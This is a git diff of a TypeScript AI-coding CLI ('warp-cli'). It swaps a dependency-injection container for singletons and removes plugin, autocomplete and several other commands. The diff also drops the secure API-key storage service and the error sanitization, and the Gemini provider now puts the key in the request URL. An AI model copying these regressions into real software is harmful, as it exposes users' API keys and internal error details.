-async function manageConfig(options: any): Promise<void> {
+async function manageConfig(options: CliOptions): Promise<void> {
   try {
     if (options.reset) {
       configService.reset();
-      uiRenderer.renderSuccess('Configuration reset to defaults');
+      uiRenderer.renderSuccess("Configuration reset to defaults");
       return;
     }
 
     if (options.list) {
       const config = configService.getAll();
-      uiRenderer.renderBox('Configuration', JSON.stringify(config, null, 2), {
-        color: 'cyan'
+      uiRenderer.renderBox("Configuration", JSON.stringify(config, null, 2), {
+        color: "cyan",
       });
       return;
     }
@@ -204,18 +258,18 @@ async function manageConfig(options: any): Promise<void> {
     }
 
     if (options.set) {
-      const [key, ...valueParts] = options.set.split('=');
-      const value = valueParts.join('=');
+      const [key, ...valueParts] = options.set.split("=");
+      const value = valueParts.join("=");
 
       if (!value) {
-        throw new Error('Invalid format. Use: --set key=value');
+        throw new Error("Invalid format. Use: --set key=value");
       }
 
       try {
-        const parsedValue = JSON.parse(value);
+        const parsedValue = JSON.parse(value) as JsonValue;
         configService.set(key as any, parsedValue);
       } catch {
-        configService.set(key as any, value as any);
+        configService.set(key as any, value);
       }
 
       uiRenderer.renderSuccess(`Set ${key} = ${value}`);
@@ -224,24 +278,24 @@ async function manageConfig(options: any): Promise<void> {
 
     // Show help
     program.help();
-  } catch (error: any) {
-    uiRenderer.renderError(error.message);
+  } catch (error: unknown) {
+    uiRenderer.renderError((error as Error).message || String(error));
     process.exit(1);
   }
 }
 
-async function manageSessions(options: any): Promise<void> {
+async function manageSessions(options: CliOptions): Promise<void> {
   try {
     await sessionService.initialize();
 
     if (options.list) {
       const sessions = await sessionService.listSessions();
-      const headers = ['ID', 'Name', 'Created', 'Updated'];
-      const rows = sessions.map(s => [
+      const headers = ["ID", "Name", "Created", "Updated"];
+      const rows = sessions.map((s) => [
         s.id.substring(0, 8),
         s.name,
         s.created.toLocaleString(),
-        s.updated.toLocaleString()
+        s.updated.toLocaleString(),
       ]);
       uiRenderer.renderTable(headers, rows);
       return;
@@ -254,7 +308,8 @@ async function manageSessions(options: any): Promise<void> {
     }
 
     if (options.export) {
-      const format = options.format || 'json';
+      const format: "json" | "markdown" =
+        (options.format as "json" | "markdown") || "json";
       const data = await sessionService.exportSession(options.export, format);
       console.log(data);
       return;
@@ -262,75 +317,75 @@ async function manageSessions(options: any): Promise<void> {
 
     // Show help
     program.help();
-  } catch (error: any) {
-    uiRenderer.renderError(error.message);
+  } catch (error: unknown) {
+    uiRenderer.renderError((error as Error).message || String(error));
     process.exit(1);
   }
 }
 
 async function runSetup(): Promise<void> {
-  const inquirer = await import('inquirer');
+  const inquirer = await import("inquirer");
 
   uiRenderer.clear();
   uiRenderer.renderBox(
-    'Warp CLI Setup',
-    'Welcome! Let\'s configure your AI coding assistant.',
-    { color: 'cyan' }
+    "Warp CLI Setup",
+    "Welcome! Let's configure your AI coding assistant.",
+    { color: "cyan" },
   );
 
   const answers = await inquirer.default.prompt([
     {
-      type: 'list',
-      name: 'provider',
-      message: 'Choose your default LLM provider:',
+      type: "list",
+      name: "provider",
+      message: "Choose your default LLM provider:",
       choices: [
-        { name: 'Ollama (Local)', value: 'ollama' },
-        { name: 'OpenAI', value: 'openai' },
-        { name: 'Anthropic (Claude)', value: 'anthropic' },
-        { name: 'Google Gemini', value: 'gemini' }
-      ]
-    }
+        { name: "Ollama (Local)", value: "ollama" },
+        { name: "OpenAI", value: "openai" },
+        { name: "Anthropic (Claude)", value: "anthropic" },
+        { name: "Google Gemini", value: "gemini" },
+      ],
+    },
   ]);
 
-  configService.set('defaultProvider', answers.provider);
+  configService.set("defaultProvider", answers.provider);
 
   // Provider-specific setup
-  if (answers.provider === 'ollama') {
+  if (answers.provider === "ollama") {
     const ollamaAnswers = await inquirer.default.prompt([
       {
-        type: 'input',
-        name: 'endpoint',
-        message: 'Ollama endpoint:',
-        default: 'http://localhost:11434'
+        type: "input",
+        name: "endpoint",
+        message: "Ollama endpoint:",
+        default: "http://localhost:11434",
       },
       {
-        type: 'input',
-        name: 'model',
-        message: 'Default model:',
-        default: 'llama3.2'
-      }
+        type: "input",
+        name: "model",
+        message: "Default model:",
+        default: "llama3.2",
+      },
     ]);
 
-    configService.setProviderConfig('ollama', ollamaAnswers);
+    configService.setProviderConfig("ollama", ollamaAnswers);
   } else {
     const apiAnswers = await inquirer.default.prompt([
       {
-        type: 'password',
-        name: 'apiKey',
+        type: "password",
+        name: "apiKey",
         message: `${answers.provider} API Key:`,
-        mask: '*'
+        mask: "*",
       },
       {
-        type: 'input',
-        name: 'model',
-        message: 'Default model:',
+        type: "input",
+        name: "model",
+        message: "Default model:",
         default:
-          answers.provider === 'openai'
-            ? 'gpt-4-turbo-preview'
-            : answers.provider === 'anthropic'
-            ? 'claude-3-5-sonnet-20241022'
-            : 'gemini-1.5-flash'
-      }
+          answers.provider === "openai"
+            ? "gpt-4-turbo-preview"
+            : answers.provider === "anthropic"
+              ? "claude-3-5-sonnet-20241022"
+              : "gemini-1.5-flash",
+      },
     ]);
 
     configService.setProviderConfig(answers.provider, apiAnswers);
@@ -339,22 +394,22 @@ async function runSetup(): Promise<void> {
   // UI preferences
   const uiAnswers = await inquirer.default.prompt([
     {
-      type: 'confirm',
-      name: 'streaming',
-      message: 'Enable streaming responses?',
-      default: true
+      type: "confirm",
+      name: "streaming",
+      message: "Enable streaming responses?",
+      default: true,
     },
     {
-      type: 'confirm',
-      name: 'markdown',
-      message: 'Enable markdown rendering?',
-      default: true
-    }
+      type: "confirm",
+      name: "markdown",
+      message: "Enable markdown rendering?",
+      default: true,
+    },
   ]);
 
-  configService.set('ui', {
-    ...configService.get('ui'),
-    ...uiAnswers
+  configService.set("ui", {
+    ...configService.get("ui"),
+    ...uiAnswers,
   });
 
   uiRenderer.renderSuccess('Setup complete! Run "warp" to start chatting.');
diff --git a/warp-cli/src/commands/handlers.ts b/warp-cli/src/commands/handlers.ts
index 333b4b0..c340bc5 100644
--- a/warp-cli/src/commands/handlers.ts
+++ b/warp-cli/src/commands/handlers.ts
@@ -1,41 +1,11 @@
+import { uiRenderer } from '../ui/renderer';
+import { sessionService } from '../services/session.service';
+import { chatService } from '../services/chat.service';
+import { configService } from '../services/config.service';
+import { contextService } from '../services/context.service';
 import { format } from 'date-fns';
-import { ContextService, sanitizeError } from '../services/context.service';
-import { SessionService } from '../services/session.service';
-import { ChatService } from '../services/chat.service';
-import { ConfigService } from '../services/config.service';
-import { WarpUIRenderer } from '../ui/renderer';
-import { PluginService } from '../services/plugin.service';
-import { AutocompleteService } from '../services/autocomplete.service';
-
-type CommandHandlerDeps = {
-  uiRenderer: WarpUIRenderer;
-  sessionService: SessionService;
-  chatService: ChatService;
-  configService: ConfigService;
-  contextService: ContextService;
-  pluginService: PluginService;
-  autocompleteService: AutocompleteService;
-};
 
 export class CommandHandler {
-  private readonly uiRenderer: WarpUIRenderer;
-  private readonly sessionService: SessionService;
-  private readonly chatService: ChatService;
-  private readonly configService: ConfigService;
-  private readonly contextService: ContextService;
-  private readonly pluginService: PluginService;
-  private readonly autocompleteService: AutocompleteService;
-
-  constructor({ uiRenderer, sessionService, chatService, configService, contextService, pluginService, autocompleteService }: CommandHandlerDeps) {
-    this.uiRenderer = uiRenderer;
-    this.sessionService = sessionService;
-    this.chatService = chatService;
-    this.configService = configService;
-    this.contextService = contextService;
-    this.pluginService = pluginService;
-    this.autocompleteService = autocompleteService;
-  }
-
   async handleCommand(input: string): Promise<boolean> {
     const trimmed = input.trim();
 
@@ -52,109 +22,109 @@ export class CommandHandler {
         case 'help':
           await this.handleHelp();
           break;
+
         case 'clear':
           await this.handleClear();
           break;
+
         case 'exit':
         case 'quit':
           await this.handleExit();
-          return true;
+          return true; // Signal to exit
+
         case 'new':
           await this.handleNew(argsString);
           break;
+
         case 'save':
           await this.handleSave(argsString);
           break;
+
         case 'load':
           await this.handleLoad(argsString);
           break;
+
         case 'list':
           await this.handleList();
           break;
+
         case 'delete':
           await this.handleDelete(argsString);
           break;
+
         case 'search':
           await this.handleSearch(argsString);
           break;
+
         case 'export':
           await this.handleExport(argsString);
           break;
+
         case 'config':
           await this.handleConfig();
           break;
+
         case 'provider':
           await this.handleProvider(argsString);
           break;
+
         case 'model':
           await this.handleModel(argsString);
           break;
+
         case 'context':
           await this.handleContext();
           break;
-        case 'ctxfile':
-          await this.handleContextFiles(argsString);
-          break;
+
         case 'exec':
           await this.handleExec(argsString);
           break;
+
         case 'git':
           await this.handleGit(argsString);
           break;
-        case 'diff':
-          await this.handleDiff(argsString);
-          break;
+
         case 'stats':
           await this.handleStats();
           break;
+
         case 'explain':
           await this.handleExplain(argsString);
           break;
+
         case 'suggest':
           await this.handleSuggest(argsString);
           break;
-        case 'plugins':
-          await this.handlePlugins();
-          break;
-        case 'plugin':
-          await this.handlePlugin(argsString);
-          break;
-        case 'undo':
-          await this.handleUndo();
-          break;
-        case 'autocomplete':
-          await this.handleAutocomplete(argsString);
-          break;
+
         default:
-          this.uiRenderer.renderError(`Unknown command: /${command}. Type /help for available commands.`);
+          uiRenderer.renderError(`Unknown command: /${command}. Type /help for available commands.`);
       }
     } catch (error: any) {
-      const sanitizedError = sanitizeError(error);
-      this.uiRenderer.renderError(sanitizedError);
+      uiRenderer.renderError(error.message);
     }
 
     return false;
   }
 
   private async handleHelp(): Promise<void> {
-    this.uiRenderer.renderHelp();
+    uiRenderer.renderHelp();
   }
 
   private async handleClear(): Promise<void> {
-    this.uiRenderer.clear();
-    this.uiRenderer.renderWelcome();
+    uiRenderer.clear();
+    uiRenderer.renderWelcome();
   }
 
   private async handleExit(): Promise<void> {
-    this.uiRenderer.renderInfo('Saving session and exiting...');
-    await this.sessionService.cleanup();
+    uiRenderer.renderInfo('Saving session and exiting...');
+    await sessionService.cleanup();
     process.exit(0);
   }
 
   private async handleNew(name?: string): Promise<void> {
-    const session = await this.sessionService.createSession(name);
-    this.uiRenderer.renderSuccess(`New session created: ${session.name}`);
-    this.uiRenderer.renderSessionInfo({
+    const session = await sessionService.createSession(name);
+    uiRenderer.renderSuccess(`New session created: ${session.name}`);
+    uiRenderer.renderSessionInfo({
       name: session.name,
       messageCount: session.messages.length,
       created: session.created
@@ -162,7 +132,7 @@ export class CommandHandler {
   }
 
   private async handleSave(name?: string): Promise<void> {
-    const session = this.sessionService.getCurrentSession();
+    const session = sessionService.getCurrentSession();
     if (!session) {
       throw new Error('No active session to save');
     }
@@ -171,8 +141,8 @@ export class CommandHandler {
       session.name = name;
     }
 
-    await this.sessionService.saveCurrentSession();
-    this.uiRenderer.renderSuccess(`Session saved: ${session.name} (ID: ${session.id})`);
+    await sessionService.saveCurrentSession();
+    uiRenderer.renderSuccess(`Session saved: ${session.name} (ID: ${session.id})`);
   }
 
   private async handleLoad(id: string): Promise<void> {
@@ -180,13 +150,13 @@ export class CommandHandler {
       throw new Error('Please provide a session ID. Use /list to see available sessions.');
     }
 
-    const session = await this.sessionService.loadSession(id);
+    const session = await sessionService.loadSession(id);
     if (!session) {
       throw new Error(`Session not found: ${id}`);
     }
 
-    this.uiRenderer.renderSuccess(`Loaded session: ${session.name}`);
-    this.uiRenderer.renderSessionInfo({
+    uiRenderer.renderSuccess(`Loaded session: ${session.name}`);
+    uiRenderer.renderSessionInfo({
       name: session.name,
       messageCount: session.messages.length,
       created: session.created
@@ -194,19 +164,21 @@ export class CommandHandler {
 
     // Display recent messages
     if (session.messages.length > 0) {
-      this.uiRenderer.renderInfo('Recent messages:');
+      uiRenderer.renderInfo('Recent messages:');
       session.messages.slice(-3).forEach(msg => {
-        this.uiRenderer.renderMessage(msg);
+        uiRenderer.renderMessage(msg);
       });
     }
   }
 
   private async handleList(): Promise<void> {
-    const sessions = await this.sessionService.listSessions();
+    const sessions = await sessionService.listSessions();
+
     if (sessions.length === 0) {
-      this.uiRenderer.renderInfo('No sessions found.');
+      uiRenderer.renderInfo('No sessions found.');
       return;
     }
+
     const headers = ['ID', 'Name', 'Created', 'Updated'];
     const rows = sessions.map(s => [
       s.id.substring(0, 8),
@@ -214,7 +186,8 @@ export class CommandHandler {
       format(s.created, 'MMM dd, yyyy HH:mm'),
       format(s.updated, 'MMM dd, yyyy HH:mm')
     ]);
-    this.uiRenderer.renderTable(headers, rows);
+
+    uiRenderer.renderTable(headers, rows);
   }
 
   private async handleDelete(id: string): Promise<void> {
@@ -222,8 +195,8 @@ export class CommandHandler {
       throw new Error('Please provide a session ID to delete.');
     }
 
-    await this.sessionService.deleteSession(id);
-    this.uiRenderer.renderSuccess(`Session deleted: ${id}`);
+    await sessionService.deleteSession(id);
+    uiRenderer.renderSuccess(`Session deleted: ${id}`);
   }
 
   private async handleSearch(query: string): Promise<void> {
@@ -231,10 +204,10 @@ export class CommandHandler {
       throw new Error('Please provide a search query.');
     }
 
-    const sessions = await this.sessionService.searchSessions(query);
+    const sessions = await sessionService.searchSessions(query);
 
     if (sessions.length === 0) {
-      this.uiRenderer.renderInfo('No matching sessions found.');
+      uiRenderer.renderInfo('No matching sessions found.');
       return;
     }
 
@@ -245,7 +218,7 @@ export class CommandHandler {
       format(s.created, 'MMM dd, yyyy HH:mm')
     ]);
 
-    this.uiRenderer.renderTable(headers, rows);
+    uiRenderer.renderTable(headers, rows);
   }
 
   private async handleExport(args: string): Promise<void> {
@@ -256,22 +229,22 @@ export class CommandHandler {
     }
 
     const exportFormat = (format as 'json' | 'markdown') || 'json';
-    const data = await this.sessionService.exportSession(id, exportFormat);
+    const data = await sessionService.exportSession(id, exportFormat);
 
     console.log(data);
   }
 
   private async handleConfig(): Promise<void> {
-    const config = this.configService.getAll();
-    this.uiRenderer.renderBox('Current Configuration', JSON.stringify(config, null, 2), {
+    const config = configService.getAll();
+    uiRenderer.renderBox('Current Configuration', JSON.stringify(config, null, 2), {
       color: 'cyan'
     });
   }
 
   private async handleProvider(name: string): Promise<void> {
     if (!name) {
-      const current = this.chatService.getCurrentProvider();
-      this.uiRenderer.renderInfo(`Current provider: ${current}`);
+      const current = chatService.getCurrentProvider();
+      uiRenderer.renderInfo(`Current provider: ${current}`);
       return;
     }
 
@@ -280,9 +253,9 @@ export class CommandHandler {
       throw new Error(`Invalid provider. Choose from: ${validProviders.join(', ')}`);
     }
 
-    await this.chatService.switchProvider(name as any);
-    this.configService.set('defaultProvider', name as any);
-    this.uiRenderer.renderSuccess(`Switched to provider: ${name}`);
+    await chatService.switchProvider(name as any);
+    configService.set('defaultProvider', name as any);
+    uiRenderer.renderSuccess(`Switched to provider: ${name}`);
   }
 
   private async handleModel(name: string): Promise<void> {
@@ -290,103 +263,37 @@ export class CommandHandler {
       throw new Error('Please provide a model name.');
     }
 
-    const provider = this.configService.get('defaultProvider');
-    const providerConfig = this.configService.getProviderConfig(provider);
+    const provider = configService.get('defaultProvider');
+    const providerConfig = configService.getProviderConfig(provider);
 
     if (providerConfig) {
       (providerConfig as any).model = name;
-      this.configService.setProviderConfig(provider, providerConfig);
-      this.uiRenderer.renderSuccess(`Model set to: ${name}`);
+      configService.setProviderConfig(provider, providerConfig);
+      uiRenderer.renderSuccess(`Model set to: ${name}`);
     }
   }
 
   private async handleContext(): Promise<void> {
-    const context = await this.contextService.getContext();
-    this.uiRenderer.renderBox('Current Context', JSON.stringify(context, null, 2), {
+    const context = await contextService.getContext();
+    uiRenderer.renderBox('Current Context', JSON.stringify(context, null, 2), {
       color: 'cyan'
     });
   }
 
-  private async handleContextFiles(args: string): Promise<void> {
-    const [action = 'list', ...rest] = args.split(/\s+/).filter(Boolean);
-    switch (action) {
-      case 'add': {
-        const filePath = rest.join(' ');
-        if (!filePath) {
-          throw new Error('Usage: /ctxfile add <path>');
-        }
-        const attachment = await this.contextService.attachFile(filePath);
-        this.uiRenderer.renderSuccess(`Attached ${attachment.path} (${attachment.size} bytes)`);
-        break;
-      }
-      case 'remove': {
-        const target = rest.join(' ');
-        if (!target) {
-          throw new Error('Usage: /ctxfile remove <path>');
-        }
-        const removed = this.contextService.removeAttachedFile(target);
-        if (removed) {
-          this.uiRenderer.renderSuccess(`Removed attachment: ${target}`);
-        } else {
-          this.uiRenderer.renderWarning(`Attachment not found: ${target}`);
-        }
-        break;
-      }
-      case 'clear': {
-        this.contextService.clearAttachedFiles();
-        this.uiRenderer.renderSuccess('Cleared all context file attachments.');
-        break;
-      }
-      default: {
-        const attachments = this.contextService.listAttachedFiles();
-        if (attachments.length === 0) {
-          this.uiRenderer.renderInfo('No context files attached. Use /ctxfile add <path>.');
-          return;
-        }
-        const rows = attachments.map(file => [
-          file.path,
-          `${file.size} bytes`,
-          new Date(file.updated).toLocaleString()
-        ]);
-        this.uiRenderer.renderTable(['Path', 'Size', 'Updated'], rows);
-      }
-    }
-  }
-
   private async handleExec(command: string): Promise<void> {
     if (!command) {
       throw new Error('Please provide a command to execute.');
     }
 
-    await this.chatService.executeCommand(command);
+    await chatService.executeCommand(command);
   }
 
   private async handleGit(args: string): Promise<void> {
-    await this.chatService.executeCommand(`git ${args}`);
-  }
-
-  private async handleDiff(args: string): Promise<void> {
-    const tokens = args.split(/\s+/).filter(Boolean);
-    let staged = false;
-    const targetParts: string[] = [];
-    tokens.forEach(token => {
-      if (token === '--staged') {
-        staged = true;
-      } else {
-        targetParts.push(token);
-      }
-    });
-    const target = targetParts.join(' ');
-    const diff = await this.contextService.getDiff(target || undefined, { staged });
-    if (!diff.trim() || diff === 'No changes detected.') {
-      this.uiRenderer.renderInfo(diff.trim() ? diff : 'No changes detected.');
-      return;
-    }
-    this.uiRenderer.renderCodeBlock(diff, 'diff');
+    await chatService.executeCommand(`git ${args}`);
   }
 
   private async handleStats(): Promise<void> {
-    const stats = await this.sessionService.getSessionStats();
+    const stats = await sessionService.getSessionStats();
 
     const statsText = [
       `Total Sessions: ${stats.totalSessions}`,
@@ -397,7 +304,7 @@ export class CommandHandler {
       .filter(Boolean)
       .join('\n');
 
-    this.uiRenderer.renderBox('Statistics', statsText, { color: 'green' });
+    uiRenderer.renderBox('Statistics', statsText, { color: 'green' });
   }
 
   private async handleExplain(command: string): Promise<void> {
@@ -405,7 +312,7 @@ export class CommandHandler {
       throw new Error('Please provide a command to explain.');
     }
 
-    await this.chatService.explainCommand(command);
+    await chatService.explainCommand(command);
   }
 
   private async handleSuggest(task: string): Promise<void> {
@@ -413,57 +320,8 @@ export class CommandHandler {
       throw new Error('Please describe the task.');
     }
 
-    await this.chatService.suggestCommand(task);
-  }
-
-  private async handlePlugins(): Promise<void> {
-    const plugins = this.pluginService.listPlugins();
-    if (plugins.length === 0) {
-      this.uiRenderer.renderInfo('No plugins installed. Drop .js files into ~/.warp-cli/plugins to extend the CLI.');
-      return;
-    }
-    const rows = plugins.map(plugin => [
-      plugin.name,
-      plugin.description,
-      plugin.version || '‚Äî',
-      plugin.source
-    ]);
-    this.uiRenderer.renderTable(['Name', 'Description', 'Version', 'Source'], rows);
-  }
-
-  private async handlePlugin(args: string): Promise<void> {
-    const [name, ...pluginArgs] = args.split(/\s+/).filter(Boolean);
-    if (!name) {
-      throw new Error('Usage: /plugin <name> [args]');
-    }
-    const context = await this.contextService.getContext();
-    const result = await this.pluginService.execute(name, pluginArgs, context);
-    if (result.output) {
-      this.uiRenderer.renderBox(`Plugin: ${name}`, result.output, { color: 'magenta' });
-    }
-    if (result.highlights?.length) {
-      this.uiRenderer.renderList(result.highlights, true);
-    }
-    if (result.metadata) {
-      this.uiRenderer.renderBox('Plugin Metadata', JSON.stringify(result.metadata, null, 2), { color: 'gray' });
-    }
-  }
-
-  private async handleUndo(): Promise<void> {
-    const { removed } = this.sessionService.undoLastInteraction();
-    this.uiRenderer.renderSuccess(`Removed ${removed.length} message(s) from the session.`);
-  }
-
-  private async handleAutocomplete(prefix: string): Promise<void> {
-    if (!prefix) {
-      throw new Error('Usage: /autocomplete <prefix>');
-    }
-    const suggestions = this.autocompleteService.suggest(prefix);
-    if (suggestions.length === 0) {
-      this.uiRenderer.renderInfo('No suggestions found for that prefix.');
-      return;
-    }
-    const rows = suggestions.map(item => [item.value, item.description || '']);
-    this.uiRenderer.renderTable(['Suggestion', 'Description'], rows);
+    await chatService.suggestCommand(task);
   }
 }
+
+export const commandHandler = new CommandHandler();
diff --git a/warp-cli/src/container.ts b/warp-cli/src/container.ts
deleted file mode 100644
index 2853228..0000000
--- a/warp-cli/src/container.ts
+++ /dev/null
@@ -1,43 +0,0 @@
-import { ConfigService } from './services/config.service';
-import { ContextService } from './services/context.service';
-import { SessionStorage } from './storage/session.storage';
-import { SessionService } from './services/session.service';
-import { ProviderFactory } from './providers';
-import { WarpUIRenderer } from './ui/renderer';
-import { ChatService } from './services/chat.service';
-import { CommandHandler } from './commands/handlers';
-import { PluginService } from './services/plugin.service';
-import { AutocompleteService } from './services/autocomplete.service';
-
-class AppContainer {
-  readonly configService = new ConfigService();
-  readonly contextService = new ContextService();
-  readonly uiRenderer = new WarpUIRenderer();
-  readonly providerFactory = new ProviderFactory();
-  readonly sessionStorage = new SessionStorage(this.configService.getSessionDirectory());
-  readonly pluginService = new PluginService();
-  readonly autocompleteService = new AutocompleteService(this.pluginService);
-  readonly sessionService = new SessionService({
-    contextService: this.contextService,
-    configService: this.configService,
-    storage: this.sessionStorage
-  });
-  readonly chatService = new ChatService({
-    providerFactory: this.providerFactory,
-    sessionService: this.sessionService,
-    contextService: this.contextService,
-    configService: this.configService,
-    uiRenderer: this.uiRenderer
-  });
-  readonly commandHandler = new CommandHandler({
-    uiRenderer: this.uiRenderer,
-    sessionService: this.sessionService,
-    chatService: this.chatService,
-    configService: this.configService,
-    contextService: this.contextService,
-    pluginService: this.pluginService,
-    autocompleteService: this.autocompleteService
-  });
-}
-
-export const container = new AppContainer();
diff --git a/warp-cli/src/errors.ts b/warp-cli/src/errors.ts
deleted file mode 100644
index ee00de8..0000000
--- a/warp-cli/src/errors.ts
+++ /dev/null
@@ -1,25 +0,0 @@
-// Structured error hierarchy for warp-cli
-export class AICliError extends Error {
-  constructor(
-    public code: string,
-    message: string,
-    public details?: unknown
-  ) {
-    super(message);
-    this.name = 'AICliError';
-  }
-}
-
-export class CommandExecutionError extends AICliError {
-  constructor(message: string, details?: unknown) {
-    super('COMMAND_EXECUTION', message, details);
-    this.name = 'CommandExecutionError';
-  }
-}
-
-export class ProviderError extends AICliError {
-  constructor(message: string, details?: unknown) {
-    super('PROVIDER', message, details);
-    this.name = 'ProviderError';
-  }
-}
diff --git a/warp-cli/src/index.ts b/warp-cli/src/index.ts
index c13dff1..6cf1045 100644
--- a/warp-cli/src/index.ts
+++ b/warp-cli/src/index.ts
@@ -1,13 +1,11 @@
 // Main exports for the Warp CLI library
 
-export * from './types';
-export * from './providers';
-export * from './services/config.service';
-export * from './services/context.service';
-export * from './services/session.service';
-export * from './services/chat.service';
-export * from './services/plugin.service';
-export * from './services/autocomplete.service';
-export * from './storage/session.storage';
-export * from './ui/renderer';
-export * from './commands/handlers';
+export * from "./types";
+export * from "./providers";
+export * from "./services/config.service";
+export * from "./services/context.service";
+export * from "./services/session.service";
+export * from "./services/chat.service";
+export * from "./storage/session-storage";
+export * from "./ui/renderer";
+export * from "./commands/handlers";
diff --git a/warp-cli/src/providers/anthropic.provider.ts b/warp-cli/src/providers/anthropic.provider.ts
index b91e248..859a7bc 100644
--- a/warp-cli/src/providers/anthropic.provider.ts
+++ b/warp-cli/src/providers/anthropic.provider.ts
@@ -1,7 +1,6 @@
 import Anthropic from '@anthropic-ai/sdk';
 import { BaseLLMProvider } from './base.provider';
 import { LLMConfig, Message } from '../types';
-import { secureConfigService } from '../services/secure-config.service';
 
 export class AnthropicProvider extends BaseLLMProvider {
   name = 'anthropic';
@@ -9,12 +8,10 @@ export class AnthropicProvider extends BaseLLMProvider {
 
   async initialize(config: LLMConfig): Promise<void> {
     await super.initialize(config);
-    // Fetch API key from secure storage
-    const apiKey = await secureConfigService.getApiKey('anthropic');
-    if (!apiKey) {
-      throw new Error('Anthropic API key is required. Please set it using the config command.');
+    if (!config.apiKey) {
+      throw new Error('Anthropic API key is required');
     }
-    this.client = new Anthropic({ apiKey });
+    this.client = new Anthropic({ apiKey: config.apiKey });
   }
 
   async chat(messages: Message[], config?: Partial<LLMConfig>): Promise<string> {
diff --git a/warp-cli/src/providers/gemini.provider.ts b/warp-cli/src/providers/gemini.provider.ts
index f7ae9e8..5f23b4d 100644
--- a/warp-cli/src/providers/gemini.provider.ts
+++ b/warp-cli/src/providers/gemini.provider.ts
@@ -1,76 +1,70 @@
-import fetch, { type RequestInit } from 'node-fetch';
-import { BaseLLMProvider } from './base.provider';
-import { LLMConfig, Message } from '../types';
-import { secureConfigService } from '../services/secure-config.service';
-import Bottleneck from 'bottleneck';
-
-const limiter = new Bottleneck({
-  maxConcurrent: 5,
-  minTime: 200
-});
-
-// Adjusted limitedFetch to use the correct arguments
-const limitedFetch = limiter.wrap((url: string, options: RequestInit) => fetch(url, options));
+import fetch from "node-fetch";
+import { BaseLLMProvider } from "./base.provider";
+import { LLMConfig, Message } from "../types";
 
 export class GeminiProvider extends BaseLLMProvider {
-  name = 'gemini';
+  name = "gemini";
 
-  async chat(messages: Message[], config?: Partial<LLMConfig>): Promise<string> {
+  async chat(
+    messages: Message[],
+    config?: Partial<LLMConfig>,
+  ): Promise<string> {
     const effectiveConfig = this.getEffectiveConfig(config);
 
-    // Fetch API key from secure storage
-    const apiKey = await secureConfigService.getApiKey('gemini');
-    if (!apiKey) {
-      throw new Error('Gemini API key is required. Please set it using the config command.');
+    if (!effectiveConfig.apiKey) {
+      throw new Error("Gemini API key is required");
     }
 
-    const model = effectiveConfig.model || 'gemini-1.5-flash';
-    const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent`;
+    const model = effectiveConfig.model || "gemini-1.5-flash";
+    const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${effectiveConfig.apiKey}`;
 
     // Convert messages to Gemini format
-    const systemMessages = messages.filter(m => m.role === 'system');
-    const conversationMessages = messages.filter(m => m.role !== 'system');
+    const systemMessages = messages.filter((m) => m.role === "system");
+    const conversationMessages = messages.filter((m) => m.role !== "system");
 
-    const contents = conversationMessages.map(m => ({
-      role: m.role === 'assistant' ? 'model' : 'user',
-      parts: [{ text: m.content }]
+    const contents = conversationMessages.map((m) => ({
+      role: m.role === "assistant" ? "model" : "user",
+      parts: [{ text: m.content }],
     }));
 
     // Add system prompt as first user message
     if (systemMessages.length > 0) {
       contents.unshift({
-        role: 'user',
-        parts: [{ text: `System: ${systemMessages.map(m => m.content).join('\n\n')}` }]
+        role: "user",
+        parts: [
+          {
+            text: `System: ${systemMessages.map((m) => m.content).join("\n\n")}`,
+          },
+        ],
       });
     }
 
     try {
-      const response = await limitedFetch(apiUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${apiKey}`
-        },
+      const response = await fetch(apiUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           contents,
           generationConfig: {
             temperature: effectiveConfig.temperature || 0.7,
             topP: effectiveConfig.topP || 0.9,
-            maxOutputTokens: effectiveConfig.maxTokens || 2000
-          }
-        })
+            maxOutputTokens: effectiveConfig.maxTokens || 2000,
+          },
+        }),
       });
 
       if (!response.ok) {
         const errorData: any = await response.json().catch(() => ({}));
-        throw new Error(`Gemini API error: ${response.status} ${errorData.error?.message || response.statusText}`);
+        throw new Error(
+          `Gemini API error: ${response.status} ${errorData.error?.message || response.statusText}`,
+        );
       }
 
       const data: any = await response.json();
       const content = data.candidates?.[0]?.content?.parts?.[0]?.text;
 
       if (!content) {
-        throw new Error('No response content from Gemini API');
+        throw new Error("No response content from Gemini API");
       }
 
       return content;
@@ -81,23 +75,18 @@ export class GeminiProvider extends BaseLLMProvider {
 
   async isAvailable(): Promise<boolean> {
     try {
-      // Fetch API key from secure storage
-      const apiKey = await secureConfigService.getApiKey('gemini');
-      if (!apiKey) return false;
+      if (!this.config?.apiKey) return false;
 
       // Test with a simple request
-      const model = this.config?.model || 'gemini-1.5-flash';
-      const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent`;
-
-      const response = await limitedFetch(apiUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${apiKey}`
-        },
+      const model = this.config.model || "gemini-1.5-flash";
+      const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${this.config.apiKey}`;
+
+      const response = await fetch(apiUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          contents: [{ role: 'user', parts: [{ text: 'test' }] }]
-        })
+          contents: [{ role: "user", parts: [{ text: "test" }] }],
+        }),
       });
 
       return response.ok;
diff --git a/warp-cli/src/providers/index.ts b/warp-cli/src/providers/index.ts
index 4c9f77d..c914828 100644
--- a/warp-cli/src/providers/index.ts
+++ b/warp-cli/src/providers/index.ts
@@ -41,4 +41,6 @@ export class ProviderFactory {
   }
 }
 
+export const providerFactory = new ProviderFactory();
+
 export { OllamaProvider, OpenAIProvider, AnthropicProvider, GeminiProvider };
diff --git a/warp-cli/src/providers/ollama.provider.ts b/warp-cli/src/providers/ollama.provider.ts
index b9db582..d4b8587 100644
--- a/warp-cli/src/providers/ollama.provider.ts
+++ b/warp-cli/src/providers/ollama.provider.ts
@@ -1,15 +1,6 @@
-import fetch, { type RequestInit } from 'node-fetch';
+import fetch from 'node-fetch';
 import { BaseLLMProvider } from './base.provider';
 import { LLMConfig, Message } from '../types';
-import Bottleneck from 'bottleneck';
-
-const limiter = new Bottleneck({
-  maxConcurrent: 5,
-  minTime: 200
-});
-
-// Adjusted limitedFetch to use the correct arguments
-const limitedFetch = limiter.wrap((url: string, options: RequestInit) => fetch(url, options));
 
